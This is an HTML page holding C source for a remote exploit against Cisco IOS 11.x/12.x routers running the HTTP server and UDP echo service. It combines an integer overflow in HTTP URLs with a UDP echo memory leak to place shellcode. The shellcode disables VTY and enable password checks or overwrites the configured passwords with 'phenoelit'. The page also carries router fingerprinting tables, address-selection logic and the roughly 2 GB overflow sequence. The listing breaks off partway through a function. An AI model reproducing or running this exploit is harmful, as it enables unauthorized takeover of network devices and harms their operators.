<html>
<head>
<title>Cisco IOS 12.x/11.x HTTP Remote Integer Overflow Exploit
</title>
<pre>
/*
*               ..--==[[ Phenoelit ]]==--..
*              /                                     \
*             |       CISCO CASUM EST      |
*              \..                                 ../
*                 ~~---==(MMIII)==---~~
* 
*
* Cisco IOS 12.x/11.x remote exploit for HTTP integer overflow in URL using 
* IOS 11.x UDP Echo memory leak for shellcode placing and address calculation.
*
* This code does support exploitation of any 11.x Cisco 1600 and 2500 series 
* running &quot;ip http server&quot; and &quot;service udp-small-servers&quot;. In other words, 
* port 80 TCP and port 7 UDP have to be open. The exploitation will take a 
* very long time since the overflow is triggered by sending 2 Gigabytes of 
* data to the device. Depending on your connection to the target, this may 
* take up to several DAYS.
*
* Shellcodes:
* o In case a 1600 running 11.3(11b) IP only is detected, a runtime IOS 
* patching shellcode is used. After that, the device will no longer 
* validate VTY and enable access passwords. Mission accomplished.
* o In case of any other 11.x IOS or in case it runs from flash where 
* code patching is more complicated, the shellcode will replace all 
* passwords in the config with &quot;phenoelit&quot; and reboot the box. Change
* the passwords in the shellcodes if you like.
*
* ---
* FX of Phenoelit &lt;fx at phenoelit.de&gt;
* 
*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

#include &lt;netinet/in.h&gt;
#include &lt;rpc/types.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;

#include &quot;protocols.h&quot;
#include &quot;packets.h&quot;

char m68nop[] = &quot;\x4E\x71&quot;;
char returncode[] = 
&quot;\x24\x7c\x02\x0b\xfe\x30&quot; //moveal #34340400,%a2 (0x00000000)
&quot;\x34\xbc\x4e\x75&quot; //movew #20085,%a2@ (0x00000006)
&quot;\x24\x7c\x02\x04\xae\xfa&quot; //moveal #33861370,%a2 (0x0000000A)
&quot;\x24\xfc\x30\x3c\x00\x01&quot; //movel #809238529,%a2@+ (0x00000010)
&quot;\x24\xfc\x4c\xee\x04\x0c&quot; //movel #1290667020,%a2@+ (0x00000016)
&quot;\x24\xfc\xff\xf4\x4e\x5e&quot; //movel #-766370,%a2@+ (0x0000001C)
&quot;\x24\xfc\x4e\x75\x00\x00&quot; //movel #1316290560,%a2@+ (0x00000022)
&quot;\x24\x7c\x02\x07\x21\x6a&quot; //moveal #34021738,%a2 (0x00000028)
&quot;\x34\xbc\x4e\x71&quot; //movew #20081,%a2@ (0x0000002E)
&quot;\x24\x4f&quot; //moveal %sp,%a2 (0x00000032)
&quot;\x0c\x1f\x00\x02&quot; //cmpib #2,%sp@+ (0x00000034)
&quot;\x0c\x97\x02\x19\xfc\xc0&quot; //cmpil #35257536,%sp@ (0x00000038)
&quot;\x66\x00\xff\xf4&quot; //bnew 34 &lt;findret&gt; (0x0000003E)
&quot;\x24\x8f&quot; //movel %sp,%a2@ (0x00000042)
&quot;\x59\x92&quot; //subql #4,%a2@ (0x00000044)
&quot;\x2c\x52&quot; //moveal %a2@,%fp (0x00000046)
&quot;\x42\x80&quot; //clrl %d0 (0x00000048)
&quot;\x4c\xee\x04\x00\xff\xfc&quot; //moveml %fp@(-4),%a2 (0x0000004A)
&quot;\x4e\x5e&quot; //unlk %fp (0x00000050)
&quot;\x4e\x75&quot; //rts (0x00000052)
;

char modcfg[] =
&quot;\x20\x7c\x0f\xf0\x10\xc2&quot; //moveal #267391170,%a0 (0x00000000)
&quot;\xe2\xd0&quot; //lsrw %a0@ (0x00000006)
&quot;\x46\xfc\x27\x00&quot; //movew #9984,%sr (0x00000008)
&quot;\x20\x7c\x0f\xf0\x10\xc2&quot; //moveal #267391170,%a0 (0x0000000C)
&quot;\x30\xbc\x00\x01&quot; //movew #1,%a0@ (0x00000012)
&quot;\x20\x7c\x0e\x00\x00\x00&quot; //moveal #234881024,%a0 (0x00000016)
&quot;\x54\x88&quot; //addql #2,%a0 (0x0000001C)
&quot;\x0c\x50\xab\xcd&quot; //cmpiw #-21555,%a0@ (0x0000001E)
&quot;\x66\xf8&quot; //bnes 1c &lt;find_magic&gt; (0x00000022)
&quot;\x22\x48&quot; //moveal %a0,%a1 (0x00000024)
&quot;\x58\x89&quot; //addql #4,%a1 (0x00000026)
&quot;\x24\x49&quot; //moveal %a1,%a2 (0x00000028)
&quot;\x50\x8a&quot; //addql #8,%a2 (0x0000002A)
&quot;\x50\x8a&quot; //addql #8,%a2 (0x0000002C)
&quot;\x0c\x12\x00\x00&quot; //cmpib #0,%a2@ (0x0000002E)
&quot;\x67\x28&quot; //beqs 5c &lt;end_of_config&gt; (0x00000032)
&quot;\x4b\xfa\x00\xc6&quot; //lea %pc@(fc &lt;S_password&gt;),%a5 (0x00000034)
&quot;\x61\x5a&quot; //bsrs 94 &lt;strstr&gt; (0x00000038)
&quot;\x4a\x80&quot; //tstl %d0 (0x0000003A)
&quot;\x67\x08&quot; //beqs 46 &lt;next1&gt; (0x0000003C)
&quot;\x28\x40&quot; //moveal %d0,%a4 (0x0000003E)
&quot;\x4b\xfa\x00\xcf&quot; //lea %pc@(111 &lt;REPLACE_password&gt;),%a5 (0x00000040)
&quot;\x61\x62&quot; //bsrs a8 &lt;nvcopy&gt; (0x00000044)
&quot;\x4b\xfa\x00\xc0&quot; //lea %pc@(108 &lt;S_enable&gt;),%a5 (0x00000046)
&quot;\x61\x48&quot; //bsrs 94 &lt;strstr&gt; (0x0000004A)
&quot;\x4a\x80&quot; //tstl %d0 (0x0000004C)
&quot;\x67\x08&quot; //beqs 58 &lt;next2&gt; (0x0000004E)
&quot;\x28\x40&quot; //moveal %d0,%a4 (0x00000050)
&quot;\x4b\xfa\x00\xc8&quot; //lea %pc@(11c &lt;REPLACE_enable&gt;),%a5 (0x00000052)
&quot;\x61\x50&quot; //bsrs a8 &lt;nvcopy&gt; (0x00000056)
&quot;\x52\x8a&quot; //addql #1,%a2 (0x00000058)
&quot;\x60\xd2&quot; //bras 2e &lt;modmain&gt; (0x0000005A)
&quot;\x32\xbc\x00\x00&quot; //movew #0,%a1@ (0x0000005C)
&quot;\x7e\x01&quot; //moveq #1,%d7 (0x00000060)
&quot;\x2c\x3c\x00\x00\xff\xff&quot; //movel #65535,%d6 (0x00000062)
&quot;\x9d\x47&quot; //subxw %d7,%d6 (0x00000068)
&quot;\x6b\xfc&quot; //bmis 68 &lt;chksm_delay&gt; (0x0000006A)
&quot;\x2a\x48&quot; //moveal %a0,%a5 (0x0000006C)
&quot;\x61\x50&quot; //bsrs c0 &lt;chksum&gt; (0x0000006E)
&quot;\x32\x86&quot; //movew %d6,%a1@ (0x00000070)
&quot;\x7e\x01&quot; //moveq #1,%d7 (0x00000072)
&quot;\x28\x3c\x00\x00\xff\xff&quot; //movel #65535,%d4 (0x00000074)
&quot;\x99\x47&quot; //subxw %d7,%d4 (0x0000007A)
&quot;\x6b\xfc&quot; //bmis 7a &lt;final_delay&gt; (0x0000007C)
&quot;\x46\xfc\x27\x00&quot; //movew #9984,%sr (0x0000007E)
&quot;\x20\x7c\x0f\xf0\x00\x00&quot; //moveal #267386880,%a0 (0x00000082)
&quot;\x2e\x50&quot; //moveal %a0@,%sp (0x00000088)
&quot;\x20\x7c\x0f\xf0\x00\x04&quot; //moveal #267386884,%a0 (0x0000008A)
&quot;\x20\x50&quot; //moveal %a0@,%a0 (0x00000090)
&quot;\x4e\xd0&quot; //jmp %a0@ (0x00000092)
&quot;\x28\x4a&quot; //moveal %a2,%a4 (0x00000094)
&quot;\x0c\x15\x00\x00&quot; //cmpib #0,%a5@ (0x00000096)
&quot;\x67\x08&quot; //beqs a4 &lt;strstr_endofstr&gt; (0x0000009A)
&quot;\xb9\x0d&quot; //cmpmb %a5@+,%a4@+ (0x0000009C)
&quot;\x67\xf6&quot; //beqs 96 &lt;strstr_2&gt; (0x0000009E)
&quot;\x42\x80&quot; //clrl %d0 (0x000000A0)
&quot;\x4e\x75&quot; //rts (0x000000A2)
&quot;\x20\x0c&quot; //movel %a4,%d0 (0x000000A4)
&quot;\x4e\x75&quot; //rts (0x000000A6)
&quot;\x7e\x01&quot; //moveq #1,%d7 (0x000000A8)
&quot;\x0c\x15\x00\x00&quot; //cmpib #0,%a5@ (0x000000AA)
&quot;\x67\x0e&quot; //beqs be &lt;nvcopy_end&gt; (0x000000AE)
&quot;\x18\xdd&quot; //moveb %a5@+,%a4@+ (0x000000B0)
&quot;\x2c\x3c\x00\x00\xff\xff&quot; //movel #65535,%d6 (0x000000B2)
&quot;\x9d\x47&quot; //subxw %d7,%d6 (0x000000B8)
&quot;\x6b\xfc&quot; //bmis b8 &lt;nvcopy_delay&gt; (0x000000BA)
&quot;\x60\xec&quot; //bras aa &lt;nvcopyl1&gt; (0x000000BC)
&quot;\x4e\x75&quot; //rts (0x000000BE)
&quot;\x42\x87&quot; //clrl %d7 (0x000000C0)
&quot;\x42\x80&quot; //clrl %d0 (0x000000C2)
&quot;\x0c\x55\x00\x00&quot; //cmpiw #0,%a5@ (0x000000C4)
&quot;\x66\x0a&quot; //bnes d4 &lt;chk_hack&gt; (0x000000C8)
&quot;\x52\x80&quot; //addql #1,%d0 (0x000000CA)
&quot;\x0c\x80\x00\x00\x00\x0a&quot; //cmpil #10,%d0 (0x000000CC)
&quot;\x67\x08&quot; //beqs dc &lt;chk2&gt; (0x000000D2)
&quot;\x42\x86&quot; //clrl %d6 (0x000000D4)
&quot;\x3c\x1d&quot; //movew %a5@+,%d6 (0x000000D6)
&quot;\xde\x86&quot; //addl %d6,%d7 (0x000000D8)
&quot;\x60\xe8&quot; //bras c4 &lt;chk1&gt; (0x000000DA)
&quot;\x2c\x07&quot; //movel %d7,%d6 (0x000000DC)
&quot;\x2a\x07&quot; //movel %d7,%d5 (0x000000DE)
&quot;\x02\x86\x00\x00\xff\xff&quot; //andil #65535,%d6 (0x000000E0)
&quot;\xe0\x8d&quot; //lsrl #8,%d5 (0x000000E6)
&quot;\xe0\x8d&quot; //lsrl #8,%d5 (0x000000E8)
&quot;\xdc\x45&quot; //addw %d5,%d6 (0x000000EA)
&quot;\x28\x06&quot; //movel %d6,%d4 (0x000000EC)
&quot;\x02\x84\xff\xff\x00\x00&quot; //andil #-65536,%d4 (0x000000EE)
&quot;\x66\x00\xff\xea&quot; //bnew e0 &lt;chk3&gt; (0x000000F4)
&quot;\x46\x46&quot; //notw %d6 (0x000000F8)
&quot;\x4e\x75&quot; //rts (0x000000FA)

&quot;\x0a&quot;&quot; password &quot;&quot;\x00&quot;
&quot;\x0a&quot;&quot;enable &quot;&quot;\x00&quot;
&quot;phenoelit\x0a&quot;&quot;\x00&quot;
&quot;password phenoelit\x0a&quot;&quot;\x00&quot;
;


char modcfg2k5[] = 
&quot;\x46\xfc\x27\x00&quot; //movew #9984,%sr (0x00000000)
&quot;\x20\x7c\x02\x00\x00\x00&quot; //moveal #33554432,%a0 (0x00000004)
&quot;\x54\x88&quot; //addql #2,%a0 (0x0000000A)
&quot;\x0c\x50\xab\xcd&quot; //cmpiw #-21555,%a0@ (0x0000000C)
&quot;\x66\xf8&quot; //bnes a &lt;find_magic&gt; (0x00000010)
&quot;\x22\x48&quot; //moveal %a0,%a1 (0x00000012)
&quot;\x58\x89&quot; //addql #4,%a1 (0x00000014)
&quot;\x24\x49&quot; //moveal %a1,%a2 (0x00000016)
&quot;\x50\x8a&quot; //addql #8,%a2 (0x00000018)
&quot;\x50\x8a&quot; //addql #8,%a2 (0x0000001A)
&quot;\x0c\x12\x00\x00&quot; //cmpib #0,%a2@ (0x0000001C)
&quot;\x67\x28&quot; //beqs 4a &lt;end_of_config&gt; (0x00000020)
&quot;\x4b\xfa\x00\xd6&quot; //lea %pc@(fa &lt;S_password&gt;),%a5 (0x00000022)
&quot;\x61\x6a&quot; //bsrs 92 &lt;strstr&gt; (0x00000026)
&quot;\x4a\x80&quot; //tstl %d0 (0x00000028)
&quot;\x67\x08&quot; //beqs 34 &lt;next1&gt; (0x0000002A)
&quot;\x28\x40&quot; //moveal %d0,%a4 (0x0000002C)
&quot;\x4b\xfa\x00\xdf&quot; //lea %pc@(10f &lt;REPLACE_password&gt;),%a5 (0x0000002E)
&quot;\x61\x72&quot; //bsrs a6 &lt;nvcopy&gt; (0x00000032)
&quot;\x4b\xfa\x00\xd0&quot; //lea %pc@(106 &lt;S_enable&gt;),%a5 (0x00000034)
&quot;\x61\x58&quot; //bsrs 92 &lt;strstr&gt; (0x00000038)
&quot;\x4a\x80&quot; //tstl %d0 (0x0000003A)
&quot;\x67\x08&quot; //beqs 46 &lt;next2&gt; (0x0000003C)
&quot;\x28\x40&quot; //moveal %d0,%a4 (0x0000003E)
&quot;\x4b\xfa\x00\xd8&quot; //lea %pc@(11a &lt;REPLACE_enable&gt;),%a5 (0x00000040)
&quot;\x61\x60&quot; //bsrs a6 &lt;nvcopy&gt; (0x00000044)
&quot;\x52\x8a&quot; //addql #1,%a2 (0x00000046)
&quot;\x60\xd2&quot; //bras 1c &lt;modmain&gt; (0x00000048)
&quot;\x42\x80&quot; //clrl %d0 (0x0000004A)
&quot;\x2a\x49&quot; //moveal %a1,%a5 (0x0000004C)
&quot;\x52\x00&quot; //addqb #1,%d0 (0x0000004E)
&quot;\x1a\xfc\x00\x00&quot; //moveb #0,%a5@+ (0x00000050)
&quot;\x7e\x01&quot; //moveq #1,%d7 (0x00000054)
&quot;\x2c\x3c\x00\x00\xff\xff&quot; //movel #65535,%d6 (0x00000056)
&quot;\x9d\x47&quot; //subxw %d7,%d6 (0x0000005C)
&quot;\x6b\xfc&quot; //bmis 5c &lt;chksm_delay&gt; (0x0000005E)
&quot;\x0c\x00\x00\x02&quot; //cmpib #2,%d0 (0x00000060)
&quot;\x66\xe8&quot; //bnes 4e &lt;chksm_del&gt; (0x00000064)
&quot;\x2a\x48&quot; //moveal %a0,%a5 (0x00000066)
&quot;\x61\x54&quot; //bsrs be &lt;chksum&gt; (0x00000068)
&quot;\x2a\x49&quot; //moveal %a1,%a5 (0x0000006A)
&quot;\x52\x8d&quot; //addql #1,%a5 (0x0000006C)
&quot;\x42\x80&quot; //clrl %d0 (0x0000006E)
&quot;\x52\x00&quot; //addqb #1,%d0 (0x00000070)
&quot;\x1a\x86&quot; //moveb %d6,%a5@ (0x00000072)
&quot;\x7e\x01&quot; //moveq #1,%d7 (0x00000074)
&quot;\x28\x3c\x00\x00\xff\xff&quot; //movel #65535,%d4 (0x00000076)
&quot;\x99\x47&quot; //subxw %d7,%d4 (0x0000007C)
&quot;\x6b\xfc&quot; //bmis 7c &lt;final_delay&gt; (0x0000007E)
&quot;\xe0\x4e&quot; //lsrw #8,%d6 (0x00000080)
&quot;\x2a\x49&quot; //moveal %a1,%a5 (0x00000082)
&quot;\x0c\x00\x00\x02&quot; //cmpib #2,%d0 (0x00000084)
&quot;\x66\xe6&quot; //bnes 70 &lt;final_wr&gt; (0x00000088)
&quot;\x20\x7c\x03\x00\x00\x60&quot; //moveal #50331744,%a0 (0x0000008A)
&quot;\x4e\xd0&quot; //jmp %a0@ (0x00000090)
&quot;\x28\x4a&quot; //moveal %a2,%a4 (0x00000092)
&quot;\x0c\x15\x00\x00&quot; //cmpib #0,%a5@ (0x00000094)
&quot;\x67\x08&quot; //beqs a2 &lt;strstr_endofstr&gt; (0x00000098)
&quot;\xb9\x0d&quot; //cmpmb %a5@+,%a4@+ (0x0000009A)
&quot;\x67\xf6&quot; //beqs 94 &lt;strstr_2&gt; (0x0000009C)
&quot;\x42\x80&quot; //clrl %d0 (0x0000009E)
&quot;\x4e\x75&quot; //rts (0x000000A0)
&quot;\x20\x0c&quot; //movel %a4,%d0 (0x000000A2)
&quot;\x4e\x75&quot; //rts (0x000000A4)
&quot;\x7e\x01&quot; //moveq #1,%d7 (0x000000A6)
&quot;\x0c\x15\x00\x00&quot; //cmpib #0,%a5@ (0x000000A8)
&quot;\x67\x0e&quot; //beqs bc &lt;nvcopy_end&gt; (0x000000AC)
&quot;\x18\xdd&quot; //moveb %a5@+,%a4@+ (0x000000AE)
&quot;\x2c\x3c\x00\x00\xff\xff&quot; //movel #65535,%d6 (0x000000B0)
&quot;\x9d\x47&quot; //subxw %d7,%d6 (0x000000B6)
&quot;\x6b\xfc&quot; //bmis b6 &lt;nvcopy_delay&gt; (0x000000B8)
&quot;\x60\xec&quot; //bras a8 &lt;nvcopyl1&gt; (0x000000BA)
&quot;\x4e\x75&quot; //rts (0x000000BC)
&quot;\x42\x87&quot; //clrl %d7 (0x000000BE)
&quot;\x42\x80&quot; //clrl %d0 (0x000000C0)
&quot;\x0c\x55\x00\x00&quot; //cmpiw #0,%a5@ (0x000000C2)
&quot;\x66\x0a&quot; //bnes d2 &lt;chk_hack&gt; (0x000000C6)
&quot;\x52\x80&quot; //addql #1,%d0 (0x000000C8)
&quot;\x0c\x80\x00\x00\x00\x14&quot; //cmpil #20,%d0 (0x000000CA)
&quot;\x67\x08&quot; //beqs da &lt;chk2&gt; (0x000000D0)
&quot;\x42\x86&quot; //clrl %d6 (0x000000D2)
&quot;\x3c\x1d&quot; //movew %a5@+,%d6 (0x000000D4)
&quot;\xde\x86&quot; //addl %d6,%d7 (0x000000D6)
&quot;\x60\xe8&quot; //bras c2 &lt;chk1&gt; (0x000000D8)
&quot;\x2c\x07&quot; //movel %d7,%d6 (0x000000DA)
&quot;\x2a\x07&quot; //movel %d7,%d5 (0x000000DC)
&quot;\x02\x86\x00\x00\xff\xff&quot; //andil #65535,%d6 (0x000000DE)
&quot;\xe0\x8d&quot; //lsrl #8,%d5 (0x000000E4)
&quot;\xe0\x8d&quot; //lsrl #8,%d5 (0x000000E6)
&quot;\xdc\x45&quot; //addw %d5,%d6 (0x000000E8)
&quot;\x28\x06&quot; //movel %d6,%d4 (0x000000EA)
&quot;\x02\x84\xff\xff\x00\x00&quot; //andil #-65536,%d4 (0x000000EC)
&quot;\x66\x00\xff\xea&quot; //bnew de &lt;chk3&gt; (0x000000F2)
&quot;\x46\x46&quot; //notw %d6 (0x000000F6)
&quot;\x4e\x75&quot; //rts (0x000000F8)

&quot;\x0a&quot;&quot; password &quot;&quot;\x00&quot;
&quot;\x0a&quot;&quot;enable &quot;&quot;\x00&quot;
&quot;phenoelit\x0a&quot;&quot;\x00&quot;
&quot;password phenoelit\x0a&quot;&quot;\x00&quot;
;

//
// address selection strategies 
//
#define S_RANDOM 1
#define S_LAST 2
#define S_SMALLEST 3
#define S_HIGHEST 4
#define S_FREQUENT 5
typedef struct {
unsigned int a;
unsigned int count;
} addrs_t;
#define LOW_ADDR_THR 5
#define LOW_COUNT_THR 3


//
// IO memory block header based fingerprinting
//
static struct {
unsigned int PC_start;
unsigned int PC_end;
unsigned int IO_start;
unsigned int IO_end;
char *name;
unsigned char *code;
unsigned int codelen;
unsigned char *nop;
unsigned int noplen;
unsigned int fakefp;
} cisco_boxes[] = {
{0x08000000, 0x08ffffff, 0x02C00000, 0x02FFFFFF,
&quot;Cisco 1600 series, run from Flash&quot;, 
modcfg, sizeof(modcfg)-1, 
m68nop, sizeof(m68nop)-1 ,
0x02f0f1f2
},

{0x0208F600, 0x0208F93C, 0x02C00000, 0x02FFFFFF,
&quot;Cisco 1603, 11.3(11b) IP only, run from RAM&quot;, 
returncode, sizeof(returncode)-1,
m68nop, sizeof(m68nop)-1 ,
0x02f0f1f2
},

{0x03000000, 0x037FFFFF, 0x00E00000, 0x00FFFFFF,
&quot;Cisco 2500 series, run from Flash&quot;,
modcfg2k5, sizeof(modcfg2k5)-1,
m68nop, sizeof(m68nop)-1,
0x00079000
},

{0,0,0,0,NULL,NULL,0,NULL,0,0}
};


// ***************** Status and other tracking *******************

//
// HTTP communication 
//
struct {
int sfd;
unsigned int done;
} http;

// 
// UDP leak 
//
#define MAXADDRS 100
#define DEFAULTRUNS 206
#define LOCALPORT 31336 // almost 31337 ;)
#define PACKETMAX 1400
struct {
int sfd;
int udpsfd;
int guess;
addrs_t addrs[MAXADDRS];
unsigned int addrc;
unsigned int lastaddr;
int nop_offset;
int nop_sled;
} leak;

//
// config
//
struct {
char *device;
char *target;
struct in_addr target_addr;
int verbose;
int testmode;
int strategy;
unsigned int leakme;
unsigned int timeout;
unsigned int leakruns;
} cfg;


//
// function prototypes
//
void usage(char *s);
void *smalloc(size_t s);
int HTTPpre(void);
void HTTPsend(char *what);
int IOSlack(unsigned int runs, int shellcode);
unsigned char *UDPecho( unsigned int *plen, 
unsigned char *payload, unsigned int payload_len);
void UDPanalyze(unsigned char *b, unsigned int len,
unsigned char *expected, unsigned int expected_length);
unsigned int SelectAddress(void);
int CheckForbidden(unsigned int address);


// *************************** main code *************************


int main(int argc, char **argv) {
// 
// HTTP elements
//
char token6[] =&quot;/Cisco&quot;;
char token50[]=&quot;/AnotherLemmingAndAntoherLemmingAndAnotherLemmingX&quot;;
char token48[]=&quot;/HereComesTheFinalLemmingAndClosesTheGapForever/&quot;;
char httpend[]=&quot; HTTP/1.0\r\n\r\n&quot;;
char overflow[30];
// 
// stuff we need
//
unsigned int i;
int saved_guess;
unsigned int retaddr;
// 
// command line
//
char option;
extern char *optarg;
//
// output stuff
//
double percent;
double lpercent=(double)0;


memset(&amp;cfg,0,sizeof(cfg));
memset(&amp;leak,0,sizeof(leak));
memset(&amp;http,0,sizeof(http));
// 
// set defaults
//
cfg.leakme=0x4C00;
cfg.timeout=3;
cfg.leakruns=DEFAULTRUNS;
cfg.strategy=S_SMALLEST;

while ((option=getopt(argc,argv,&quot;vTA:t:L:R:d:i:&quot;))!=EOF) {
switch(option) {
case 'v': cfg.verbose++;
break;
case 'T': cfg.testmode++;
break;
case 'A': cfg.strategy=(int)strtoul(optarg,(char **)NULL,10);
break;
case 't': cfg.timeout=(int)strtoul(optarg,(char **)NULL,10);
break;
case 'L': cfg.leakme=(int)strtoul(optarg,(char **)NULL,10);
break;
case 'R': cfg.leakruns=(int)strtoul(optarg,(char **)NULL,10);
break;
case 'd': {
struct hostent *he;
if ((he=gethostbyname(optarg))==NULL) { 
fprintf(stderr,&quot;Could not resolve %s\n&quot;,cfg.target);
return (-1);
}
bcopy(he-&gt;h_addr,
(char *)&amp;(cfg.target_addr.s_addr),
he-&gt;h_length);
cfg.target=smalloc(strlen(optarg)+1);
strcpy(cfg.target,optarg);
}
break;
case 'i': cfg.device=smalloc(strlen(optarg)+1);
strcpy(cfg.device,optarg);
break;
default: usage(argv[0]);
// does not return
}
}

// 
// idiot check
//
if ( !(cfg.device &amp;&amp; *((u_int32_t *)&amp;(cfg.target_addr)) )) 
usage(argv[0]);

//
// verify the UDP leak and make sure it's a known box
//
if (IOSlack(1,-1)!=0) {
fprintf(stderr,&quot;You need an IOS 11.x target with UDP echo service enabled\n&quot;
&quot;for this thing to work. Obviously, you don't have that.\n&quot;);
return (1);
}
if (leak.guess==(-1)) {
fprintf(stderr,&quot;Apparently, you got a good target, but it's not one of the\n&quot;
&quot;platforms we got code for. Life sucks.\n&quot;);
return (1);
} else {
printf(&quot;Target identified as '%s'.\n&quot;,cisco_boxes[leak.guess].name);
if (cfg.verbose) {
printf(&quot;Using the following code:\n&quot;);
hexdump(cisco_boxes[leak.guess].code,
cisco_boxes[leak.guess].codelen);
}
saved_guess=leak.guess;
}
if (leak.lastaddr == 0) {
printf(&quot;The memory leak data did not contain enough information to\n&quot;
&quot;calculate the addresses correctly. The router may be busy,\n&quot;
&quot;in which case this method is likely to fail!\n&quot;);
return (2);
} else {
printf(&quot;Calculated address in test: 0x%08X\n&quot;,leak.lastaddr);
}

//
// Connect to HTTP server and send the first &quot;GET &quot;
//
if (HTTPpre()!=0) return 1;

//
// fill normal buffer
//
printf(&quot;Sending token50 x 0x5 + token6 ...\n&quot;);
HTTPsend(token50);
HTTPsend(token50);
HTTPsend(token50);
HTTPsend(token50);
HTTPsend(token50);
HTTPsend(token6);

//
// send enough data to overflow the counter
//
i=1;
printf(&quot;Sending token50 x 0x28F5C28 (2 Gigabytes of data)...\n&quot;);
while (i&lt;=0x28F5C28) {

if (!cfg.testmode) HTTPsend(token50);
http.done+=50;
i++;

//
// output
//
percent = (double)http.done / (double)0x80000000;
if ( percent &gt; lpercent+0.0001 ) {
printf(&quot;%5.2f%% done\n&quot;,percent * 100);
lpercent=percent;
}
}
printf(&quot;Sending final token48 ...\n&quot;);
HTTPsend(token48);

//
// Use infoleak to transfer code and calculate address
//
memset(&amp;leak,0,sizeof(leak));
if (IOSlack(cfg.leakruns,saved_guess)!=0) {
fprintf(stderr,&quot;Your target does no longer leak memory. This could have\n&quot;
&quot;several reasons, but it sure prevents you from exploiting it.\n&quot;);
return (-1);
} else {
printf(&quot;Aquired %u addresses with our code\n&quot;,leak.addrc);
if (leak.addrc&lt;LOW_ADDR_THR) {
printf( &quot;WARNING: This is a low number of addresses.\n&quot;
&quot; The target is probably busy!!\n&quot;);
}
}
if (saved_guess!=leak.guess) 
printf(&quot;Errrmmm... your target type changed. Just so you know, \n&quot;
&quot;it's not supposed to do that\n&quot;);

// 
// prepare the overflow buffer
//
printf(&quot;Selecting address, using nop sled of %u and offset in the sled of %u\n&quot;,
leak.nop_sled, leak.nop_offset);
if ( (retaddr=SelectAddress()) == 0) return (-1);

memset(&amp;overflow,0,sizeof(overflow));
sprintf(overflow,
&quot;BB%%%02X%%%02X%%%02X%%%02X%%%02X%%%02X%%%02X%%%02X&quot;
,
(unsigned char)( (cisco_boxes[saved_guess].fakefp&gt;&gt;24)&amp;0xFF),
(unsigned char)( (cisco_boxes[saved_guess].fakefp&gt;&gt;16)&amp;0xFF),
(unsigned char)( (cisco_boxes[saved_guess].fakefp&gt;&gt; 8)&amp;0xFF),
(unsigned char)( (cisco_boxes[saved_guess].fakefp )&amp;0xFF),
(unsigned char)( (retaddr&gt;&gt;24)&amp;0xFF),
(unsigned char)( (retaddr&gt;&gt;16)&amp;0xFF),
(unsigned char)( (retaddr&gt;&gt; 8)&amp;0xFF),
(unsigned char)( (retaddr )&amp;0xFF));

if (cfg.verbose) hexdump(overflow,sizeof(overflow)-1);

// 
// perform overflow and overwrite return address
//
printf(&quot;Sending overflow of %u bytes\n&quot;,strlen(overflow));
HTTPsend(overflow);
printf(&quot;Sending final HTTP/1.0\n&quot;);
HTTPsend(httpend);
close(http.sfd);

// 
// all done
//
return 0;
}


void usage(char *s) {
fprintf(stderr,&quot;Usage: %s -i &lt;interface&gt; -d &lt;target&gt; [-options]\n&quot;,s);
fprintf(stderr,&quot;Options are:\n&quot;
&quot;-v Verbose mode.\n&quot;
&quot;-T Test mode, don't really exploit\n&quot;
&quot;-An Address selection strategy. Values are:\n&quot;
&quot; 1 (random), 2 (last), 3 (smallest), 4 (highest), 5 (most frequent)\n&quot;
&quot;-tn Set timeout for info leak to n seconds\n&quot;
&quot;-Ln Set requested memory leak to n bytes\n&quot;
&quot;-Rn Set number of final leak runs to n\n&quot;
);
exit (1);
}


// 
// *********************** HTTP related **************************
//


int HTTPpre(void) {
char get[] = &quot;GET &quot;;
struct sockaddr_in sin;
struct hostent *he;

memset(&amp;sin,0,sizeof(struct sockaddr_in));
if ((he=gethostbyname(cfg.target))==NULL) { 
fprintf(stderr,&quot;Could not resolve %s\n&quot;,cfg.target);
return (-1);
}

sin.sin_family=AF_INET;
sin.sin_port=htons(80);
bcopy(he-&gt;h_addr,(char *)&amp;sin.sin_addr,he-&gt;h_length);
bzero(&amp;(sin.sin_zero),8);

if ((http.sfd=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))&lt;0) {
fprintf(stderr,&quot;socket(TCP) error\n&quot;);
return(-1);
}

printf(&quot;Connecting to HTTP server on %s ...\n&quot;,cfg.target);

if (connect(http.sfd,(struct sockaddr *)&amp;sin,sizeof(sin))&lt;0) {
fprintf(stderr,&quot;Failed to connect to HTTP\n&quot;);
return (-1);
}

printf(&quot;Connected!\n&quot;);

//
// send &quot;GET &quot;
//
HTTPsend(get);
return 0;
}


void HTTPsend(char *what) {
if (send(http.sfd,what,strlen(what),0)&lt;0) {
fprintf(stderr,&quot;send() failed!\n&quot;);
exit(-1);
}
}


// 
// *********************** UDP related **************************
//

int IOSlack(unsigned int runs, int shellcode) {
// 
// the leak packet
//
#define DUMMY_SIZE 512
unsigned char *packet;
unsigned int length;
char dummy[DUMMY_SIZE];
unsigned char *sc,*st;
unsigned int sclen;
// 
// recv stuff
//
char *rbuf;
unsigned int rx;
// 
// doing the stuff
//
unsigned int r;
struct sockaddr_in frm;
int frmlen=sizeof(struct sockaddr_in);
fd_set rfds;
struct timeval tv;
int select_ret;
int recvflag;
struct sockaddr_in myself;


//
// init
//
leak.guess=(-1);
r=runs;
recvflag=0;
st=NULL;

// 
// get the sockets
//
if ( (leak.sfd=init_socket_IP4(cfg.device,1)) == (-1) ) {
fprintf(stderr,&quot;Couldn't grab a raw socket\n&quot;);
return (-1);
}

myself.sin_family=AF_INET;
myself.sin_port=htons(LOCALPORT);
myself.sin_addr.s_addr=INADDR_ANY;
if ( (leak.udpsfd=socket(PF_INET,SOCK_DGRAM,IPPROTO_UDP)) &lt;0) {
fprintf(stderr,&quot;Couldn't grab a UDP socket\n&quot;);
return (-1);
}
if ( bind(leak.udpsfd,(struct sockaddr *)&amp;myself,sizeof(struct sockaddr)) != 0) {
fprintf(stderr,&quot;bind() failed\n&quot;);
return (-1);
}

// 
// determine packet contents and make a packet
//
if (shellcode==(-1)) {
memset(&amp;dummy,0x50,DUMMY_SIZE-1);
dummy[DUMMY_SIZE-1]=0x00;
sc=dummy;
sclen=DUMMY_SIZE-1;
} else {
unsigned char *t;
unsigned int i;

t=sc=st=smalloc(PACKETMAX);
//
// calculate the remaining space for nops
//
leak.nop_sled=PACKETMAX-cisco_boxes[shellcode].codelen;
// 
// align
//
while ( (leak.nop_sled % cisco_boxes[shellcode].noplen) != 0) 
leak.nop_sled--;
